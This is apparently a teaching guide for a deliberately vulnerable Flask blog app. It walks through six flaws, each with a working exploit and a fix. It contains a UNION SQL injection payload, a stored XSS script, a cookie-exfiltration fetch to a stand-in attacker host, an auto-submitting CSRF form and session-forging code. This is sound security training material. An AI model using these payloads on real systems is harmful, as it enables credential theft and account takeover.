# Vulnerability Guide

This is the main teaching document for VulnFix-BlogApp. It walks through every
vulnerability in the app: what it is, why the code causes it, how to exploit it
yourself, what real attackers would actually do with it, and exactly how it gets
fixed.

## How this repo is organized

There are two branches:

- **`vulnerable`**: every vulnerability below is live and exploitable. Use this
  branch to practice attacking the app.
- **`main`**: the same app with every vulnerability fixed. Use this branch to read
  the secure version of the code, or to run the app for real.

Switch between them with:

```bash
git checkout vulnerable
git checkout main
```

Each section below shows the vulnerable code (as it exists on the `vulnerable`
branch) and the fixed code (as it exists on `main`), so you can read this whole
guide from either branch without switching back and forth.

If you want a second, independently-run assessment on top of this guide (found
during a real testing pass on the fixed app, not part of this walkthrough), see
[`pentesting_report.md`](pentesting_report.md). It documents a hardcoded secret
key issue, extra CSRF gaps, and weak session settings that went beyond the six
vulnerabilities below.

---

## 1. SQL Injection

### What it is

SQL injection happens when user input is inserted directly into a SQL query
string instead of being passed as a separate, properly-escaped parameter. If an
attacker controls part of that string, they can change what the query actually
does: read data they shouldn't see, bypass a `WHERE` clause, or in the worst case
modify or delete data.

### Where it lives

`search()` in `app/routes.py`. The search box on the homepage passes whatever you
type straight into an f-string that becomes the SQL query:

```python
# app/routes.py, vulnerable version
if filter_by == 'title':
    sql = f"SELECT * FROM posts WHERE title LIKE '%{query.strip()}%' ORDER BY created_at {order_clause}"
```

Notice `query.strip()` goes directly inside the quotes of the SQL string. Nothing
stops it from containing SQL syntax of its own.

### Exploit it yourself

The `posts` table has 5 columns: `id, title, content, author, created_at`. The
`users` table also has 5 columns: `id, username, password, email, is_admin`. Same
column count means you can `UNION` the two tables together and the results will
render straight into the search page, using the `posts` template fields to
display `users` data.

1. Run the app on the `vulnerable` branch and go to the homepage.
2. In the search box, paste:
   ```
   nonexistent' UNION SELECT id, password, username, email, is_admin FROM users-- 
   ```
3. Hit search. The results list (which normally shows post titles) now shows
   every user's plaintext password where the title would be, and their username
   where the author would be.

What that payload does, piece by piece:
- `nonexistent'` closes the string the app wrapped your input in.
- `UNION SELECT id, password, username, email, is_admin FROM users` appends a
  second query whose results get merged with the first, mapped into the same
  5 columns the template expects.
- `-- ` comments out the rest of the original query (the closing `%' ORDER BY...`
  that the app appends after your input), so the SQL stays valid.

### Real-world impact

This is a full, unauthenticated database read. An attacker never needs to log in.
With a UNION injection like this, and depending on the database engine, an
attacker can typically also read arbitrary tables, dump schema information, and
sometimes write to disk or execute further queries.

### The fix

Use parameterized queries: pass the user's input as a bound parameter (`?` in
SQLite), never splice it into the SQL string. The database driver handles
escaping, so the input can never break out of its slot no matter what it
contains.

```python
# app/routes.py, fixed version
like_query = f"%{query.strip()}%"
if filter_by == 'title':
    cur.execute(
        f"SELECT * FROM posts WHERE title LIKE ? ORDER BY created_at {order_clause}",
        (like_query,)
    )
```

Note that `order_clause` is still an f-string interpolation here, and that's fine:
it's never user input, it's one of two hardcoded literals (`"DESC"` or `"ASC"`)
chosen by the code itself based on a comparison, never taken directly from the
request. The rule isn't "never use an f-string near SQL", it's "never let
user-controlled data land inside the query string itself."

---

## 2. Cross-Site Scripting (XSS)

### What it is

Stored XSS happens when user-submitted content gets saved, then later rendered
back into a page as raw HTML instead of as plain text. If that content contains
a `<script>` tag, the script runs in the browser of anyone who views the page,
using that victim's session, cookies, and permissions.

### Where it lives

The `nl2br` Jinja filter in `app/routes.py`, which post content passes through
before being displayed:

```python
# app/routes.py, vulnerable version
@app.template_filter('nl2br')
def nl2br_filter(s):
    if s is None:
        return ''
    paragraphs = re.split(r'\n\s*\n', s)
    html_paragraphs = ['<p>{}</p>'.format(p.replace('\n', '<br>')) for p in paragraphs]
    return Markup('\n'.join(html_paragraphs))
```

`Markup(...)` tells Jinja "trust this string, render it as raw HTML, don't
escape it." Since `p` (the post content) was never escaped first, anything the
author typed, including `<script>` tags, gets rendered as real HTML.

### Exploit it yourself

1. Log in (or register a throwaway account) on the `vulnerable` branch.
2. Create a new post. For the content, paste:
   ```html
   <script>alert(document.cookie)</script>
   ```
3. Publish it, then view the post.
4. A JavaScript alert box pops up showing your raw session cookie.

That alert is a stand-in for what a real attacker's script would do: instead of
`alert(...)`, it would send `document.cookie` to a server the attacker controls,
for example `fetch('https://attacker.example/steal?c=' + document.cookie)`. From
there the attacker replays that cookie and is logged in as the victim, no
password needed.

This chain only works this cleanly because of vulnerability 6 below (the
session cookie has `HttpOnly` turned off, so JavaScript is allowed to read it at
all). On a properly configured cookie, `document.cookie` wouldn't include the
session value even with this same XSS present. That's why defense in depth
matters: fixing XSS closes this specific hole, but hardening the cookie limits
the damage if some other XSS is ever missed.

### Real-world impact

Session hijacking, credential phishing (rendering a fake login form inside the
page), defacement, or using the victim's authenticated session to perform
actions on their behalf (post, delete, whatever the app lets a logged-in user
do).

### The fix

Escape the content before wrapping it in HTML, so `<script>` becomes the inert
text `&lt;script&gt;` instead of a real tag:

```python
# app/routes.py, fixed version
from markupsafe import Markup, escape

@app.template_filter('nl2br')
def nl2br_filter(s):
    if s is None:
        return ''
    paragraphs = re.split(r'\n\s*\n', s)
    html_paragraphs = ['<p>{}</p>'.format(escape(p).replace('\n', '<br>')) for p in paragraphs]
    return Markup('\n'.join(html_paragraphs))
```

`escape()` runs first, so by the time `Markup()` marks the string safe, all the
dangerous characters (`<`, `>`, `&`, quotes) have already been converted to their
HTML-entity equivalents. The literal text is preserved, but it can no longer be
interpreted as markup.

---

## 3. Broken Access Control

### What it is

An endpoint that should be restricted to certain users (usually admins) but has
no check at all, so anyone who knows or guesses the URL can reach it.

### Where it lives

`/admin` in `app/routes.py`:

```python
# app/routes.py, vulnerable version
@app.route('/admin')
def admin():
    users = get_all_users()
    posts = get_all_posts()
    return render_template('admin.html', users=users, posts=posts)
```

No `@login_required`, no check of any `is_admin` flag. Any request to `/admin`
gets served, logged in or not.

### Exploit it yourself

1. Log out (or open a private/incognito browser window).
2. Go to `http://127.0.0.1:5000/admin`.
3. You're in. The page lists every registered user (username, password, email)
   and every post in the system, with no authentication required.

### Real-world impact

Full read access to the app's internal user table and content, sometimes write
access if the admin panel supports actions like deleting users or promoting
accounts. Combined with vulnerability 4 below, this is how the plaintext
passwords become trivially harvestable: just visit the page.

### The fix

Two layers of checking: is the visitor logged in at all, and if so, do they
actually have the `is_admin` flag set. Both are re-checked against the database
on every request, not trusted from anything the client sent.

```python
# app/routes.py, fixed version
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'username' not in session:
            flash('Please log in to access that page.', 'warning')
            return redirect(url_for('login'))
        user = get_user_by_username(session['username'])
        if not user or not user['is_admin']:
            flash('You do not have permission to access that page.', 'danger')
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@admin_required
def admin():
    users = get_all_users()
    posts = get_all_posts()
    return render_template('admin.html', users=users, posts=posts)
```

There's no admin-promotion UI in this app. To test the fixed version, flip the
flag directly in the database:

```bash
sqlite3 app/database.db "UPDATE users SET is_admin=1 WHERE username='yourname';"
```

---

## 4. Insecure Password Storage

### What it is

Storing user passwords as plain, readable text in the database instead of a
one-way hash. If the database is ever read by anyone who shouldn't have access
(a leaked backup, an SQL injection like vulnerability 1, an insider, a broken
access control bug like vulnerability 3), every user's actual password is
sitting right there.

### Where it lives

`add_user()` in `app/models.py`:

```python
# app/models.py, vulnerable version
def add_user(username, password, email=None, is_admin=0):
    conn   = get_db_connection()
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO users (username, password, email, is_admin) VALUES (?, ?, ?, ?)',
        (username, password, email, is_admin)
    )
    conn.commit()
    conn.close()
```

And the corresponding check in `login()` in `app/routes.py`:

```python
# app/routes.py, vulnerable version
if user and user['password'] == password:
```

A plain string comparison against whatever was stored at registration time.

### Exploit it yourself

You don't even need to break into anything separately here, since it chains
directly off vulnerabilities 1 and 3:

- Visit `/admin` (vulnerability 3) and read the `password` column straight off
  the page.
- Or use the SQL injection from vulnerability 1 to pull the same column via the
  public search box.

Either way, you now have every user's real password, in plaintext, which is
also very likely their password on other sites, since password reuse is
extremely common.

### The fix

Hash passwords with a slow, salted hashing algorithm before storing them, and
never store or compare the original password again. This project uses
`werkzeug.security`, which uses PBKDF2 under the hood:

```python
# app/models.py, fixed version
from werkzeug.security import generate_password_hash

def add_user(username, password, email=None, is_admin=0):
    conn   = get_db_connection()
    cursor = conn.cursor()
    hashed = generate_password_hash(password)
    cursor.execute(
        'INSERT INTO users (username, password, email, is_admin) VALUES (?, ?, ?, ?)',
        (username, hashed, email, is_admin)
    )
    conn.commit()
    conn.close()
```

```python
# app/routes.py, fixed version
from werkzeug.security import check_password_hash

if user and check_password_hash(user['password'], password):
```

`generate_password_hash` produces a different-looking hash every time, even for
the same password, because it includes a random salt. `check_password_hash`
knows how to pull that salt back out and redo the same hashing steps to verify a
guess without ever needing the original password back. Even someone with full
read access to the `users` table cannot recover the real password from the hash
alone, they'd have to guess passwords one at a time and hash each guess to check
it (which is exactly why the hashing algorithm is deliberately slow).

---

## 5. Cross-Site Request Forgery (CSRF)

### What it is

CSRF tricks a logged-in victim's browser into sending a request to your app that
the victim never intended, using credentials (the session cookie) their browser
attaches automatically. The attacker's page never sees the cookie value itself,
it just relies on the browser sending it along for free.

### Where it lives

Two places, on the `vulnerable` branch:

1. Every form (`login.html`, `register.html`, the delete button in
   `view_post.html`) has no CSRF token field.
2. CSRF validation is turned off app-wide, even for the one form (`new_post`)
   that's built with `Flask-WTF`, which normally validates a token
   automatically:
   ```python
   # app/routes.py, vulnerable version
   app.config['WTF_CSRF_ENABLED'] = False
   ```

### Exploit it yourself

There's a ready-made proof of concept at
[`docs/poc/csrf_delete_post.html`](poc/csrf_delete_post.html):

```html
<form id="csrf-form" action="http://127.0.0.1:5000/post/delete/15" method="POST"></form>
<script>document.getElementById('csrf-form').submit();</script>
```

1. Log in, create a post, and note its ID from the URL (`/post/<id>`).
2. Edit the PoC file's `action` to point at that ID.
3. While still logged in (same browser), open the PoC file directly
   (`file:///path/to/csrf_delete_post.html`).
4. It submits itself immediately, no click needed. Your post is deleted, and you
   never saw a confirmation dialog, because the real confirm() prompt is
   client-side JavaScript on the real site, and this page never loads the real
   site's HTML at all, it just fires a POST straight at the delete endpoint.

### Real-world impact

Any state-changing action reachable by a plain form submission is forgeable:
deleting content, changing account settings, transferring funds, anything that
only checks "is there a valid session cookie" and nothing else. A more targeted
version of this same bug can also force a login (logging the victim into an
attacker-controlled account so their subsequent actions get attributed to the
attacker), known as login CSRF.

### The fix

Require a secret, unpredictable token on every state-changing request, one that
only the real page (not a forged one) could have obtained, since it's generated
server-side and embedded in the legitimate form.

```python
# app/routes.py, fixed version
from flask_wtf import CSRFProtect
csrf = CSRFProtect(app)
```

```html
<!-- login.html / register.html / the delete form, fixed version -->
<input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

`CSRFProtect` rejects any POST/PUT/PATCH/DELETE request that doesn't carry a
valid token tied to the current session. A forged page hosted anywhere else
can't read that token off the real page (the browser's same-origin policy
blocks it), so it can't include a valid one in its forged request, and the
request gets rejected with `400 Bad Request`.

---

## 6. Weak Session Management

### What it is

The session cookie is the one thing standing between "just anybody" and "this
specific logged-in user." If it's not locked down, it becomes stealable or
forgeable through other channels.

### Where it lives

`app/routes.py`, the cookie configuration:

```python
# app/routes.py, vulnerable version
app.config['SESSION_COOKIE_HTTPONLY'] = False
app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_SAMESITE'] = None
```

Plus the hardcoded fallback secret key one line above it:

```python
app.secret_key = os.environ.get('SECRET_KEY', 'something_secret')
```

### Exploit it yourself

Two separate angles:

**Steal the cookie via XSS.** With `HttpOnly` off, JavaScript can read the
session cookie. This is exactly what the payload in vulnerability 2
(`alert(document.cookie)`) proved: if `HttpOnly` were on, `document.cookie`
would simply not include the session value, even with the same XSS bug present.

**Forge a session from the hardcoded key.** Flask signs the session cookie using
`app.secret_key`. Since the fallback value (`'something_secret'`) is committed
to the repo, anyone can compute a validly-signed cookie for any username, no
password needed:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

attacker_app = Flask(__name__)
attacker_app.config['SECRET_KEY'] = 'something_secret'
forged = SecureCookieSessionInterface().get_signing_serializer(attacker_app).dumps({'username': 'jern'})
print(forged)
```

Send that value as your `session` cookie and the app treats you as `jern`, fully
authenticated, without ever touching the login form. This is documented in more
depth, with full retest evidence, in
[`pentesting_report.md`](pentesting_report.md#32-hardcodedweak-secret_key--full-session-forgery--critical).

### Real-world impact

Full account takeover, either by intercepting/reading a cookie that should have
been off-limits to scripts, or by skipping authentication entirely and minting
your own valid session for any user in the system.

### The fix

```python
# app/routes.py, fixed version
SECRET_KEY = os.environ.get('SECRET_KEY')
if not SECRET_KEY:
    raise RuntimeError(
        'SECRET_KEY environment variable is not set. Refusing to start with an '
        'insecure hardcoded default.'
    )
app.secret_key = SECRET_KEY

app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_SECURE'] = os.environ.get('SESSION_COOKIE_SECURE', 'false').lower() == 'true'
```

`SECRET_KEY` now has to come from the environment, generated fresh, never
committed anywhere, so nobody can precompute a forged cookie against a value
they already know. `HttpOnly` blocks JavaScript from reading the cookie at all.
`SameSite=Lax` tells the browser to withhold the cookie on most cross-site
requests, which is a second layer of CSRF defense on top of the token from
vulnerability 5. `Secure` (turned on once the app is actually served over
HTTPS) stops the cookie from ever being sent in plaintext over the network.

---

## Quick reference

| # | Vulnerability | Exploited via | Fixed with |
|---|---|---|---|
| 1 | SQL Injection | `/search?q=` UNION payload | Parameterized `?` queries |
| 2 | Stored XSS | `<script>` in post content | `markupsafe.escape()` before render |
| 3 | Broken Access Control | Visiting `/admin` while logged out | `admin_required` decorator checking `is_admin` |
| 4 | Insecure Password Storage | Reading `/admin` or the SQLi output | `werkzeug.security` password hashing |
| 5 | CSRF | Auto-submitting forged form | `Flask-WTF` `CSRFProtect` + tokens |
| 6 | Weak Session Management | Reading cookie via JS, forging with known key | `HttpOnly`, `SameSite`, `Secure`, required `SECRET_KEY` |

Try each exploit on the `vulnerable` branch, then check out `main` and try it
again to see it get blocked.
